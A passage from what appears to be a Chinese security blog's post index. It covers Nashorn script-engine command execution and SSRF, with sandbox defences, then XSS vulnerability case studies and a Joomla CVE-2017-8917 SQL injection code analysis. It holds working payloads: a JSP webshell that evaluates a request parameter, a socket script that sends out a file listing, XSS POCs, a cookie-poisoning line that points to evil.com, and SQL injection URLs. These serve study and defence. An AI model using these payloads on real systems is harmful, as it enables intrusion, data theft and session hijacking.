AnnotationInvocationHandler时进行序列化，当触发 readObject() 反序列化的时候，就能实现命令执行\n参考：http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/https://security.tencent.com/index.php/blog/msg/97http://drops.wooyun.org/papers/10467http://drops.wooyun.org/papers/13244\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"Java NashornJS引擎代码安全执行","url":"/Java%20NashornJS%E5%BC%95%E6%93%8E%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%89%A7%E8%A1%8C/","content":"一、什么是Nashorn在 Java SE 7 之前，JDK 附带了一个基于 Mozilla Rhino 的 JavaScript 脚本引擎。Java SE 8 将搭载一个名为 Oracle Nashorn 的新引擎，该引擎基于JSR 292和invokedynamic. invokedynamic它通过绑定调用站点提供了对 ECMA 规范化 JavaScript 规范的更好合规性和更好的运行时性能。\n遵循ECMAScript，\nimport javax.script.ScriptEngine;import javax.script.ScriptEngineManager;public class Hello &#123;  public static void main(String... args) throws Throwable &#123;    ScriptEngineManager engineManager = new ScriptEngineManager();    ScriptEngine engine = engineManager.getEngineByName(&quot;nashorn&quot;);    engine.eval(&quot;function sum(a, b) &#123; return a + b; &#125;&quot;);    System.out.println(engine.eval(&quot;sum(1, 2);&quot;));  &#125;&#125;\n\n￼\n二、通过Nashorn实现命令执行public static void main(String[] args) throws ScriptException &#123;    String test=&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&#x27;open /System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)&#125;;&quot;;    ScriptEngineManager scriptEngineManager = new ScriptEngineManager();    ScriptEngine scriptEngine = scriptEngineManager.getEngineByName(&quot;nashorn&quot;);    scriptEngine.eval(test);&#125;\n\n三、通过Nashorn实现SSRF攻击public static void main(String[] args) throws ScriptException &#123;    //此处感谢5am3帮忙debug    //方法1        String test3 = &quot;var a=mainOutput();function mainOutput()&#123;var file=new java.io.File(\\&quot;/\\&quot;);var fileLists=file.listFiles();var s=new java.net.Socket(\\&quot;127.0.0.1\\&quot;,8200);for(var i=0;i&lt;fileLists.length;i++)&#123;var out=s.getOutputStream();out.write(fileLists[i].getName().getBytes());out.write(\\&quot;\\\\n\\&quot;.getBytes());&#125;&#125;;&quot;;        //方法2    String test5 = &quot;var a=mainOutput();function mainOutput()&#123; var url=new java.net.URL(&#x27;http://127.0.0.1:8200&#x27;);url.openConnection().getContent();&#125;;&quot;;    ScriptEngineManager scriptEngineManager = new ScriptEngineManager();    ScriptEngine scriptEngine = scriptEngineManager.getEngineByName(&quot;nashorn&quot;);    scriptEngine.eval(test5);&#125;\n\n四、其它利用一句话木马实现https://xz.aliyun.com/t/9715\n&lt;%     javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;);     engine.put(&quot;request&quot;, request);     engine.put(&quot;response&quot;, response);     engine.eval(request.getParameter(&quot;mr6&quot;));%&gt;\n\n五、防御方法5.1 NashornSandboxhttps://github.com/javadelight/delight-nashorn-sandbox\n限制类\nNashornSandbox sandbox = NashornSandboxes.create();     sandbox.allow(File.class);sandbox.eval(&quot;var File = Java.type(&#x27;java.io.File&#x27;); File;&quot;)\n实际效果\nNashornSandbox sandbox = NashornSandboxes.create();sandbox.allow(File.class);//sandbox.allow(Socket.class);sandbox.eval(test3);\n可以看到Socket没有被允许，执行失败￼￼\n5.2 自建ClassFilterpublic class EvalTest &#123;    public static void main(String[] args) throws ScriptException &#123;        String test3 = &quot;var a=mainOutput();function mainOutput()&#123;var file=new java.io.File(\\&quot;/\\&quot;);var fileLists=file.listFiles();var s=new java.net.Socket(\\&quot;127.0.0.1\\&quot;,8200);for(var i=0;i&lt;fileLists.length;i++)&#123;var out=s.getOutputStream();out.write(fileLists[i].getName().getBytes());out.write(\\&quot;\\\\n\\&quot;.getBytes());&#125;&#125;;&quot;;      //解析JS        NashornScriptEngineFactory factory = new NashornScriptEngineFactory();        ScriptEngine engine = factory.getScriptEngine(                new EvalTest.seClassFilterBlack());        engine.eval(test3);    &#125;        //黑名单方式    static class seClassFilterBlack implements ClassFilter&#123;        @Override        public boolean exposeToScripts(String s) &#123;            if (s.compareTo(&quot;java.io.File&quot;) == 0)                return false;            return true;        &#125;    &#125;    //白名单方式    static class seClassFilterWhite implements ClassFilter&#123;        @Override        public boolean exposeToScripts(String s) &#123;            if (s.compareTo(&quot;java.io.File&quot;) == 0)                return true;            return false;        &#125;    &#125;&#125;\n可以看到File没有加载，执行失败￼￼\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"Java Web 工程源码安全审计概略","url":"/Java%20Web%20%E5%B7%A5%E7%A8%8B%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%A6%82%E7%95%A5/","content":"\n0x00 框架基础0x0a 常见框架0x0b Servlet0x0c SpringMVC0x0d Spring Boot0x0e 其它0x01 面对单个应用0x0a 明确需求0x0b 确定框架0x0c 文件结构0x0d 运行流程0x0e 关键代码审计0x0f checklist + 黑盒0x03 权限控制风险0x04 其它常规漏洞0x05 面对十几万行代码更新0x0a 文件过滤0x0b 风险打标0x0c 逻辑挖掘0x0d 黑盒验证0x05 总结","categories":["应用安全"],"tags":["JAVA安全"]},{"title":"JavaParse(AST)获取Java Web API list","url":"/JavaParse(AST)%E8%8E%B7%E5%8F%96Java%20Web%20API%20list/","content":"\n分享一个人工审计代码时的小Tips\n在审计一个复杂的Web应用时，可能会有几百个WebAPI，如果没有一个API list，要想不漏掉的审计完还是非常费脑筋的\n0x00 原理通过JavaParse解析Java文件，解析出WebAPI list，简单实现效果如下\n\n\n关于JavaParse\nAnalyse, transform and generate your Java code base.\nIn its simplest form, the JavaParser library allows you to interact with Java source code as a Java object representation in a Java environment. More formally we refer to this object representation as an Abstract Syntax Tree (AST).\n0x01 目标目标：将下图代码中的WebAPI解析出来\n\n0x02 效果解析完成后的效果大致是这样的，然后在针对要筛选的条件，对api进行筛选即可，例如RequestMapping等\n[&#123;&quot;name&quot;:&quot;public List&lt;██████████&gt; ██████████(@RequestParam String ██████████)&quot;,&quot;body&quot;:&quot;Optional[&#123;██████████&#125;,&#123;&quot;name&quot;:&quot;public String ██████████(@RequestParam String ██████████)&quot;,&quot;body&quot;:&quot;Optional[&#123;██████████&#125;,&#123;&quot;name&quot;:&quot;public List&lt;██████████&gt; ██████████()&quot;,&quot;body&quot;:&quot;Optional[&#123;██████████&#125;,&#123;&quot;name&quot;:&quot;public String help()&quot;,&quot;body&quot;:&quot;Optional[&#123;██████████&#125;]\n\n\n\n0x03 代码实现package net.uxss.b1ueb0ne.javaparse;import ...@Componentpublic class MethodDeclare &#123;      public JSONArray declareParseCode(String code) &#123;        JSONArray declareJsonArray = new JSONArray();        CompilationUnit compilationUnit = JavaParser.parse(code);      //解析Java源代码并创建抽象语法树。      //解析源代码。它从提供程序获取源代码。开头指示可以在源代码中找到的内容（编译单元，块，导入...）        try &#123;            TypeDeclaration declaration = compilationUnit.getType(0);          //返回在此编译单元中声明的类型的列表。            List&lt;BodyDeclaration&gt; list = declaration.getMembers();          //获取这个类里面的成员            for (BodyDeclaration bodyDeclaration : list) &#123;              //枚举成员                Map&lt;String, String&gt; declareMap = new HashMap&lt;&gt;();                if (bodyDeclaration.isMethodDeclaration()) &#123;                  //判断是否为方法                    MethodDeclaration declareParse = (MethodDeclaration) bodyDeclaration;                    declareMap.put(&quot;name&quot;, declareParse.getDeclarationAsString());                  //获取方法名                    declareMap.put(&quot;body&quot;, declareParse.getBody().toString());                  //获取方法body                &#125;                JSONObject declareJson = JSONObject.parseObject(JSON.toJSONString(declareMap));              //解析成字符串                declareJsonArray.add(declareJson);            &#125;            compilationUnit.accept(new VoidVisitorAdapter&lt;Void&gt;() &#123;              //不返回任何内容的访问者，其所有访问方法都有一个默认实现，该实现只是以未指定的顺序访问其子方法                @Override                public void visit(MethodDeclaration n, Void arg) &#123;                    super.visit(n, arg);                &#125;            &#125;, null);        &#125;catch (Exception e)&#123;            System.out.println(e);        &#125;        return declareJsonArray;    &#125;&#125;\n\n\n\n0x04 parse方法详解com.github.javaparser.JavaParser#parse\nCompilationUnit compilationUnit = JavaParser.parse(code);\n\npublic static CompilationUnit parse(String code) &#123;        return simplifiedParse(COMPILATION_UNIT, provider(code));    &#125;\n\ncom.github.javaparser.JavaParser#simplifiedParse\nprivate static &lt;T extends Node&gt; T simplifiedParse(ParseStart&lt;T&gt; context, Provider provider) &#123;        ParseResult&lt;T&gt; result = new JavaParser(staticConfiguration).parse(context, provider);        if (result.isSuccessful()) &#123;            return result.getResult().get();        &#125;        throw new ParseProblemException(result.getProblems());    &#125;\n\ncom.github.javaparser.JavaParser#parse\n/**     * Parses source code.     * It takes the source code from a Provider.     * The start indicates what can be found in the source code (compilation unit, block, import...)     *     * @param start refer to the constants in ParseStart to see what can be parsed.     * @param provider refer to Providers to see how you can read source. The provider will be closed after parsing.     * @param &lt;N&gt; the subclass of Node that is the result of parsing in the start.     * @return the parse result, a collection of encountered problems, and some extra data.     */    public &lt;N extends Node&gt; ParseResult&lt;N&gt; parse(ParseStart&lt;N&gt; start, Provider provider) &#123;        assertNotNull(start);        assertNotNull(provider);        final GeneratedJavaParser parser = getParserForProvider(provider);        try &#123;            N resultNode = start.parse(parser);            ParseResult&lt;N&gt; result = new ParseResult&lt;&gt;(resultNode, parser.problems, parser.getTokens(),                    parser.getCommentsCollection());            configuration.getPostProcessors().forEach(postProcessor -&gt;                    postProcessor.process(result, configuration));            result.getProblems().sort(PROBLEM_BY_BEGIN_POSITION);            return result;        &#125; catch (Exception e) &#123;            final String message = e.getMessage() == null ? &quot;Unknown error&quot; : e.getMessage();            parser.problems.add(new Problem(message, null, e));            return new ParseResult&lt;&gt;(null, parser.problems, parser.getTokens(), parser.getCommentsCollection());        &#125; finally &#123;            try &#123;                provider.close();            &#125; catch (IOException e) &#123;                // Since we&#x27;re done parsing and have our result, we don&#x27;t care about any errors.            &#125;        &#125;    &#125;\n\n\n\ncom.github.javaparser.JavaParser#CompilationUnit\n/***************************************** * THE JAVA LANGUAGE GRAMMAR STARTS HERE * *****************************************//* * Program structuring syntax follows. */  final public CompilationUnit CompilationUnit() throws ParseException &#123;PackageDeclaration pakage = null;        NodeList&lt;ImportDeclaration&gt; imports = emptyList();        ImportDeclaration in = null;        NodeList&lt;TypeDeclaration&lt;?&gt;&gt; types = emptyList();    ModifierHolder modifier;        TypeDeclaration&lt;?&gt; tn = null;        ModuleDeclaration module = null;    try &#123;      label_1:      while (true) &#123;        if (jj_2_1(2)) &#123;          ;        &#125; else &#123;          break label_1;        &#125;        jj_consume_token(SEMICOLON);      &#125;      if (jj_2_2(2147483647)) &#123;        pakage = PackageDeclaration();      &#125; else &#123;        ;      &#125;      label_2:      while (true) &#123;        switch ((jj_ntk==-1)?jj_ntk_f():jj_ntk) &#123;        case ABSTRACT:        case CLASS:        case _DEFAULT:        case ENUM:        case FINAL:        case IMPORT:        case INTERFACE:        case NATIVE:        case PRIVATE:        case PROTECTED:        case PUBLIC:        case STATIC:        case STRICTFP:        case SYNCHRONIZED:        case TRANSIENT:        case VOLATILE:        case OPEN:        case MODULE:        case TRANSITIVE:        case SEMICOLON:        case AT:&#123;          ;          break;          &#125;        default:          jj_la1[0] = jj_gen;          break label_2;        &#125;        switch ((jj_ntk==-1)?jj_ntk_f():jj_ntk) &#123;        case IMPORT:&#123;          in = ImportDeclaration();imports = add(imports, in);          break;          &#125;        case ABSTRACT:        case CLASS:        case _DEFAULT:        case ENUM:        case FINAL:        case INTERFACE:        case NATIVE:        case PRIVATE:        case PROTECTED:        case PUBLIC:        case STATIC:        case STRICTFP:        case SYNCHRONIZED:        case TRANSIENT:        case VOLATILE:        case OPEN:        case MODULE:        case TRANSITIVE:        case SEMICOLON:        case AT:&#123;          modifier = Modifiers();          switch ((jj_ntk==-1)?jj_ntk_f():jj_ntk) &#123;          case CLASS:          case INTERFACE:&#123;            tn = ClassOrInterfaceDeclaration(modifier);types = add(types, tn);            break;            &#125;          case ENUM:&#123;            tn = EnumDeclaration(modifier);types = add(types, tn);            break;            &#125;          case AT:&#123;            tn = AnnotationTypeDeclaration(modifier);types = add(types, tn);            break;            &#125;          case OPEN:          case MODULE:&#123;            module = ModuleDeclaration(modifier);            break;            &#125;          case SEMICOLON:&#123;            jj_consume_token(SEMICOLON);            break;            &#125;          default:            jj_la1[1] = jj_gen;            jj_consume_token(-1);            throw new ParseException();          &#125;          break;          &#125;        default:          jj_la1[2] = jj_gen;          jj_consume_token(-1);          throw new ParseException();        &#125;      &#125;      switch ((jj_ntk==-1)?jj_ntk_f():jj_ntk) &#123;      case 0:&#123;        jj_consume_token(0);        break;        &#125;      case CTRL_Z:&#123;        jj_consume_token(CTRL_Z);        break;        &#125;      default:        jj_la1[3] = jj_gen;        jj_consume_token(-1);        throw new ParseException();      &#125;return new CompilationUnit(range(token_source.getHomeToken(), token()), pakage, imports, types, module);    &#125; catch (ParseException e) &#123;recover(EOF, e);        final CompilationUnit compilationUnit = new CompilationUnit(range(token_source.getHomeToken(), token()), null, new NodeList&lt;ImportDeclaration&gt;(), new NodeList&lt;TypeDeclaration&lt;?&gt;&gt;(), null);        compilationUnit.setParsed(UNPARSABLE);        return compilationUnit;    &#125;&#125;\n\n\n代码实现：https://github.com/langu-xyz/JavaMethodDeclare\n参考资料：https://www.javadoc.io/doc/com.github.javaparser\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"JavaScript源码分析漏洞挖掘","url":"/JavaScript%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/","content":"1. script标签的src触发xsscode：\n    &lt;script&gt;    function setInnerText(element, value) &#123;      if (element.innerText) &#123;        element.innerText = value;      &#125; else &#123;        element.textContent = value;      &#125;    &#125;    function includeGadget(url) &#123;      var scriptEl = document.createElement(&#x27;script&#x27;);      // This will totally prevent us from loading evil URLs!      if (url.match(/^https?:\\/\\//)) &#123;        //通过大小写等绕过正则检测        setInnerText(document.getElementById(&quot;log&quot;),          &quot;Sorry, cannot load a URL containing \\&quot;http\\&quot;.&quot;);        return;      &#125;      // Load this awesome gadget      scriptEl.src = url;      // Show log messages      scriptEl.onload = function() &#123;         setInnerText(document.getElementById(&quot;log&quot;),            &quot;Loaded gadget from &quot; + url);      &#125;      scriptEl.onerror = function() &#123;         setInnerText(document.getElementById(&quot;log&quot;),            &quot;Couldn&#x27;t load gadget from &quot; + url);      &#125;      document.head.appendChild(scriptEl);      //&lt;script src=&quot;data:text/javascript,alert(&#x27;1&#x27;)&quot;&gt;&lt;/script&gt;    &#125;    // Take the value after # and use it as the gadget filename.    function getGadgetName() &#123;     //获取或设置页面的标签值并进行跳转      return window.location.hash.substr(1) || &quot;/static/gadget.js&quot;;      //data:text/javascript,alert(&#x27;1&#x27;)    &#125;    includeGadget(getGadgetName());    // Extra code so that we can communicate with the parent page    window.addEventListener(&quot;message&quot;, function(event)&#123;      if (event.source == parent) &#123;        includeGadget(getGadgetName());      &#125;    &#125;, false);    &lt;/script&gt;  &lt;/head&gt;  &lt;body id=&quot;level6&quot;&gt;    &lt;img src=&quot;/static/logos/level6.png&quot;&gt;    &lt;img id=&quot;cube&quot; src=&quot;/static/level6_cube.png&quot;&gt;    &lt;div id=&quot;log&quot;&gt;Loading gadget...&lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;\n\nPOC:\n1、data:text/javascript,alert(&#39;1&#39;)2、Https://google.com/jsapi?callback=alert(1)\n思考：待分析\n2.正则匹配资源文件导致XSScode：\n(function() &#123;    var k = document.createElement(&#x27;script&#x27;);  // 创建script标签    k.type = &#x27;text/javascript&#x27;;    k.async = true;    k.setAttribute(&quot;data-id&quot;, u.pubid);    k.className = &quot;kxct&quot;;    k.setAttribute(&quot;data-version&quot;, &quot;1.9&quot;);    // 从location.href参数中读取kxsrc    var m, src = (m = location.href.match(/\\bkxsrc=([^&amp;]+)/)) &amp;&amp; decodeURIComponent(m[1]);    // 检查kxsrc参数的值是否满足正则，如果满足则加载，否则加载默认的JS文件     k.src = /^https?:\\/\\/([a-z0-9-.]+.)?krxd.net(:\\d&#123;1,5&#125;)?\\/controltag\\//i.test(src) ? src : src === &quot;disable&quot; ? &quot;&quot; : (location.protocol === &quot;https:&quot; ? &quot;https:&quot; : &quot;http:&quot;) + &quot;//cdn.krxd.net/controltag?confid=&quot; + u.pubid;    var s = document.getElementsByTagName(&#x27;script&#x27;)[0];    s.parentNode.insertBefore(k, s);&#125;)();\n\nPOC：\n/^https?:\\/\\/([a-z0-9-.]+.)?krxd.net(:\\d&#123;1,5&#125;)?\\/controltag\\//i.test(&#x27;https://a.bkrxd.net/controltag/evil.js&#x27;)\n\nFIXED：\n/^https?:\\/\\/([a-z0-9-\\.]+\\.)?krxd\\.net(:\\d&#123;1,5&#125;)?\\/controltag\\//i.test(&#x27;https://krxd.net/controltag/evil.js&#x27;)\n\n思考：\n遇到用户可控的输入，尝试绕过正则\n3.反射xss + cookie xss 攻击链code：\nidrCall: function() &#123;    var a, b;    return this.idrCallPending ? void 0 : (this.log(&quot;making idr call&quot;),    a = this.rfiServer ? this.rfiServer : &quot;a.rfihub.com&quot;,    b = this.getProtocol() + &quot;//&quot; + a + &quot;/idr.js&quot;,    this.jsonpGet(b, &#123;&#125;, this.idrCallback, &quot;cmZpSWRJbkNhY2hl&quot;),    this.idrCallPending = !0)&#125;,\n\na = this.readCookie(&quot;_rfiServer&quot;),null != a &amp;&amp; this.setRfiServer(a),\n\nPOC:\n1、CLRF注入2、subdomain xss 写入cookie\nhttps://&lt;redacted&gt;.test.com/&lt;redacted&gt;?email=aaa&quot;%20type%3d&quot;image&quot;%20src%3d1%20o&gt;nerror%3d&quot;eval(decodeURIComponent(location.hash.substr(1)))#document.cookie=&#x27;_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/&#x27;;location.href=&quot;https://get.test.com&quot;;\n\nTips:\n1、如果输出在标签内且没有过滤”，可使用类似payloadtype=&quot;image&quot; src=&quot;1&quot; onerror=&quot;alert(1)&quot;2、过滤&lt;&gt;时，正好可以利用其绕过xss auditor，oner&lt;ror\n思考：\n首先观察是否是动态生成的，如果是，观察是否直接可控，如果否，思考如果构造攻击链间接控制\nHijack the JS File of the third part CDNcode：\nhttps://tags.tiqcdn.com/utag/uber/main/prod/utag.js\n\nPOC：\n1、第三方CDN，允许个人上传2、上传个人js观察路径/data/utui/data/accounts/evilaccount/templates/main/201804081230/utag.js和目标路径/data/utui/data/accounts/uber/templates/main/utag.js3、寻找路径穿越漏洞，构造payload201804081230/../../../../&lt;victimaccount&gt;/templates/main4、/data/utui/data/accounts/evilaccount/templates/main/201804081230/../../../../&lt;victimaccount&gt;/templates/main/utag.js == /data/utui/data/accounts/&lt;victimaccount&gt;/templates/main/utag.js\n思路：\n遇到使用第三方的资源，思考下能不能控制它\n事件接受参数时控制事件触发xsscode：\n&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=&quot;/static/game-frame.js&quot;&gt;&lt;/script&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/game-frame-styles.css&quot; /&gt;    &lt;script&gt;      function startTimer(seconds) &#123;        seconds = parseInt(seconds) || 3;        setTimeout(function() &#123;           window.confirm(&quot;Time is up!&quot;);          window.history.back();        &#125;, seconds * 1000);      &#125;    &lt;/script&gt;  &lt;/head&gt;  &lt;body id=&quot;level4&quot;&gt;    &lt;img src=&quot;/static/logos/level4.png&quot; /&gt;    &lt;br&gt;    &lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#x27;&#123;&#123; timer &#125;&#125;&#x27;);&quot; /&gt;    &lt;br&gt;    &lt;div id=&quot;message&quot;&gt;Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.&lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;\n\nPOC:\n1、&#39;);alert(&#39;1\n2、&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#123;&#123; ');alert('1 &#125;&#125;&#39;);&quot; /&gt;\n思路：\n观察可控点的位置，如果为tag中，尝试bypass，优先解析value\n href tag xsscode：\n&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=&quot;/static/game-frame.js&quot;&gt;&lt;/script&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/game-frame-styles.css&quot; /&gt;  &lt;/head&gt;  &lt;body id=&quot;level5&quot;&gt;    &lt;img src=&quot;/static/logos/level5.png&quot; /&gt;&lt;br&gt;&lt;br&gt;    &lt;!-- We&#x27;re ignoring the email, but the poor user will never know! --&gt;    Enter email: &lt;input id=&quot;reader-email&quot; name=&quot;email&quot; value=&quot;&quot;&gt;    &lt;br&gt;&lt;br&gt;    &lt;a href=&quot;&#123;&#123; next &#125;&#125;&quot;&gt;Next &gt;&gt;&lt;/a&gt;  &lt;/body&gt;&lt;/html&gt;\n\nPOC:\n1、javascript:alert(1)2、&lt;a href=&quot;javascript:alert(1)&quot;&gt;Next &gt;&gt;&lt;/a&gt;\n思考：\n积累javascript:alert(1)知识点,可控的地方一定有xss\nURL拼接导致的dom xsscode：\n//Checking for potential Lever source or origin parametersvar pageUrl = window.location.href;var leverParameter = &#x27;&#x27;;var trackingPrefix = &#x27;?lever-&#x27;if( pageUrl.indexOf(trackingPrefix) &gt;= 0)&#123;  // Found Lever parameter  var pageUrlSplit = pageUrl.split(trackingPrefix);  leverParameter = &#x27;?lever-&#x27;+pageUrlSplit[1];&#125; var link = posting.hostedUrl+leverParameter;        jQuery(&#x27;#jobs-container .jobs-list&#x27;).append(      &#x27;&lt;div class=&quot;job &#x27;+teamCleanString+&#x27; &#x27;+locationCleanString.replace(&#x27;,&#x27;, &#x27;&#x27;)+&#x27; &#x27;+commitmentCleanString+&#x27;&quot;&gt;&#x27; +        &#x27;&lt;a class=&quot;job-title&quot; href=&quot;&#x27;+link+&#x27;&quot;&quot;&gt;&#x27;+title+&#x27;&lt;/a&gt;&#x27; +        &#x27;&lt;p class=&quot;tags&quot;&gt;&lt;span&gt;&#x27;+team+&#x27;&lt;/span&gt;&lt;span&gt;&#x27;+location+&#x27;&lt;/span&gt;&lt;span&gt;&#x27;+commitment+&#x27;&lt;/span&gt;&lt;/p&gt;&#x27; +        &#x27;&lt;p class=&quot;description&quot;&gt;&#x27;+shortDescription+&#x27;&lt;/p&gt;&#x27; +        &#x27;&lt;a class=&quot;btn&quot; href=&quot;&#x27;+link+&#x27;&quot;&gt;Learn more&lt;/a&gt;&#x27; +      &#x27;&lt;/div&gt;&#x27;        );\n\nPOC:1、https://www.test.com/careers?lever-#aaa&quot;&gt;&lt;script src=&quot;data:text/javascript,alert(&#39;1&#39;)&quot;&gt;&lt;/script&gt;\n","categories":["WEB安全"],"tags":["Web"]},{"title":"Joomla! 3.7 (CVE-2017-8917) 代码分析","url":"/Joomla!%203.7%20(CVE-2017-8917)%20%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/","content":"0x00 背景Security Risk: SevereExploitation Level: Easy/RemoteDREAD Score: 8.6/10Vulnerability: SQL Injection\n\n\n\n0x01 POChttp://127.0.0.1/Joomla_16/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=extractvalue(1,concat(0x7e,(select%20user()),0x7e))http://127.0.0.1/Joomla_16/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)\n\n0x02 分析MVC架构，根据poc往下扒\nCVE-2017-8917_Joomla_3.7.0\\components\\com_fields\\controller.php\npublic function __construct($config = array())\t&#123;\t\t$this-&gt;input = JFactory::getApplication()-&gt;input;\t\t// Frontpage Editor Fields Button proxying:\t\tif ($this-&gt;input-&gt;get(&#x27;view&#x27;) === &#x27;fields&#x27; &amp;&amp; $this-&gt;input-&gt;get(&#x27;layout&#x27;) === &#x27;modal&#x27;)                在这里找到了poc中的fields和modal，顺着这里继续往下\t\t&#123;\t\t\t// Load the backend language file.\t\t\t$lang = JFactory::getLanguage();\t\t\t$lang-&gt;load(&#x27;com_fields&#x27;, JPATH_ADMINISTRATOR);\t\t\t$config[&#x27;base_path&#x27;] = JPATH_COMPONENT_ADMINISTRATOR;                        设置$config[&#x27;base_path&#x27;]为administrator的components目录\t\t&#125;\t\tparent::__construct($config);\t&#125;\n\n然后跟踪这个函数到了CVE-2017-8917_Joomla_3.7.0\\libraries\\legacy\\controller\\legacy.php\npublic function __construct($config = array())&#123; .......              // Set the default model search path\t\tif (array_key_exists(&#x27;model_path&#x27;, $config))\t\t&#123;\t\t\t// User-defined dirs\t\t\t$this-&gt;addModelPath($config[&#x27;model_path&#x27;], $this-&gt;model_prefix);\t\t&#125;\t\telse\t\t&#123;\t\t\t$this-&gt;addModelPath($this-&gt;basePath . &#x27;/models&#x27;, $this-&gt;model_prefix);                       进入else分支，$this-&gt;basePath是上一段中$config[&#x27;base_path&#x27;]，即 administators/components\t\t&#125;..........&#125;\n\n继续往下走\npublic function display($cachable = false, $urlparams = array())此处进行了一个实际操作，获取view、创建model等\t&#123;\t\t$document = JFactory::getDocument();\t\t$viewType = $document-&gt;getType();\t\t$viewName = $this-&gt;input-&gt;get(&#x27;view&#x27;, $this-&gt;default_view);\t\t$viewLayout = $this-&gt;input-&gt;get(&#x27;layout&#x27;, &#x27;default&#x27;, &#x27;string&#x27;);\t\t$view = $this-&gt;getView($viewName, $viewType, &#x27;&#x27;, array(&#x27;base_path&#x27; =&gt; $this-&gt;basePath, &#x27;layout&#x27; =&gt; $viewLayout));\t\t// Get/Create the model\t\tif ($model = $this-&gt;getModel($viewName))              此处 getModel进行了一个操作，跟进\t\t&#123;\t\t\t// Push the model into the view (as default)\t\t\t$view-&gt;setModel($model, true);\t\t&#125;\t\t$view-&gt;document = $document;\n\npublic function getModel($name = &#x27;&#x27;, $prefix = &#x27;&#x27;, $config = array())&#123;\tif (empty($name))\t&#123;\t\t$name = $this-&gt;getName();\t&#125;\tif (empty($prefix))\t&#123;\t\t$prefix = $this-&gt;model_prefix;\t&#125;\tif ($model = $this-&gt;createModel($name, $prefix, $config))               调用createModel方法进行类的实例化并返回$model\t&#123;\t\t// Task is a reserved state\t\t$model-&gt;setState(&#x27;task&#x27;, $this-&gt;task);\t\t// Let&#x27;s get the application object and set menu information if it&#x27;s available\t\t$menu = JFactory::getApplication()-&gt;getMenu();\t\tif (is_object($menu))\t\t&#123;\t\t\tif ($item = $menu-&gt;getActive())\t\t\t&#123;\t\t\t\t$params = $menu-&gt;getParams($item-&gt;id);\t\t\t\t// Set default state data\t\t\t\t$model-&gt;setState(&#x27;parameters.menu&#x27;, $params);\t\t\t&#125;\t\t&#125;\t&#125;\treturn $model;&#125;\n然后接下来setModel将model Push到view中\n// Get/Create the modelif ($model = $this-&gt;getModel($viewName))&#123;\t// Push the model into the view (as default)\t$view-&gt;setModel($model, true);&#125;\n\t// Display the view\tif ($cachable &amp;&amp; $viewType != &#x27;feed&#x27; &amp;&amp; JFactory::getConfig()-&gt;get(&#x27;caching&#x27;) &gt;= 1)\t&#123;\t\t$option = $this-&gt;input-&gt;get(&#x27;option&#x27;);\t\tif (is_array($urlparams))\t\t&#123;\t\t\t$app = JFactory::getApplication();\t\t\tif (!empty($app-&gt;registeredurlparams))\t\t\t&#123;\t\t\t\t$registeredurlparams = $app-&gt;registeredurlparams;\t\t\t&#125;\t\t\telse\t\t\t&#123;\t\t\t\t$registeredurlparams = new stdClass;\t\t\t&#125;\t\t\tforeach ($urlparams as $key =&gt; $value)\t\t\t&#123;\t\t\t\t// Add your safe URL parameters with variable type as value &#123;@see JFilterInput::clean()&#125;.\t\t\t\t$registeredurlparams-&gt;$key = $value;\t\t\t&#125;\t\t\t$app-&gt;registeredurlparams = $registeredurlparams;\t\t&#125;\t\ttry\t\t&#123;\t\t\t/** @var JCacheControllerView $cache */\t\t\t$cache = JFactory::getCache($option, &#x27;view&#x27;);\t\t\t$cache-&gt;get($view, &#x27;display&#x27;);\t\t&#125;\t\tcatch (JCacheException $exception)\t\t&#123;\t\t\t$view-&gt;display();\t\t&#125;\t&#125;\telse\t&#123;\t\t$view-&gt;display();                       调用视图的display函数\t&#125;\treturn $this;&#125;\n\n跳转到视图的display函数中CVE-2017-8917_Joomla_3.7.0\\administrator\\components\\com_fields\\views\\fields\\view.html.php\n\tpublic function display($tpl = null)\t&#123;\t\t$this-&gt;state         = $this-&gt;get(&#x27;State&#x27;);                此处调用了get函数\t\t$this-&gt;items         = $this-&gt;get(&#x27;Items&#x27;);\t\t$this-&gt;pagination    = $this-&gt;get(&#x27;Pagination&#x27;);\t\t$this-&gt;filterForm    = $this-&gt;get(&#x27;FilterForm&#x27;);\t\t$this-&gt;activeFilters = $this-&gt;get(&#x27;ActiveFilters&#x27;);\t\t// Check for errors.\t\tif (count($errors = $this-&gt;get(&#x27;Errors&#x27;)))\t\t&#123;\t\t\tJError::raiseError(500, implode(&quot;\\n&quot;, $errors));\t\t\treturn false;\t\t&#125;......&#125;\n跟进上一段中的get函数CVE-2017-8917_Joomla_3.7.0\\libraries\\legacy\\view\\legacy.php\npublic function get($property, $default = null)&#123;\t// If $model is null we use the default model\tif (is_null($default))\t&#123;\t\t$model = $this-&gt;_defaultModel;\t&#125;\telse\t&#123;\t\t$model = strtolower($default);\t&#125;\t// First check to make sure the model requested exists\tif 